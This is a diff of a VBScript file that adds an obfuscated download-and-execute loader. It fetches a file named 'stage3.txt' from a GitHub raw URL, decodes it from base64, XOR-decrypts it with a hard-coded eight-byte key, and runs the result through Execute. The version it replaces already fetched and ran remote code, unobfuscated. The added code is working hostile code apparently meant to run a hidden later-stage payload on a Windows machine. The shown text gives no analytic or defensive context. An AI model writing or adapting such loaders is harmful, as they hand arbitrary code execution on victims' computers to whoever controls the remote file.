@@ -1,12 +1,32 @@
-Dim fso, sh, http, code
-Set fso = CreateObject("Scripting.FileSystemObject")
-Set sh = CreateObject("WScript.Shell")
+Dim http, b64, bytes, code, i, bVal, kIdx, xK(7), x, n
+
+xK(0) = 90
+xK(1) = 59
+xK(2) = 167
+xK(3) = 17
+xK(4) = 205
+xK(5) = 66
+xK(6) = 159
+xK(7) = 6
 
 Set http = CreateObject("WinHttp.WinHttpRequest.5.1")
 http.Open "GET", "https://raw.githubusercontent.com/rotalbilly5-sketch/Dream/main/stage3.txt", False
 http.Send
 
 If http.Status = 200 Then
-    code = http.ResponseText
+    b64 = http.ResponseText
+    Set x = CreateObject("MSXML2.DOMDocument")
+    Set n = x.createElement("b")
+    n.dataType = "bin.base64"
+    n.text = b64
+    bytes = n.nodeTypedValue
+    kIdx = 0
+    code = ""
+    For i = 1 To LenB(bytes)
+        bVal = AscB(MidB(bytes, i, 1))
+        bVal = bVal Xor xK(kIdx)
+        code = code & Chr(bVal)
+        kIdx = (kIdx + 1) Mod 8
+    Next
     If Len(code) > 0 Then Execute code
 End If
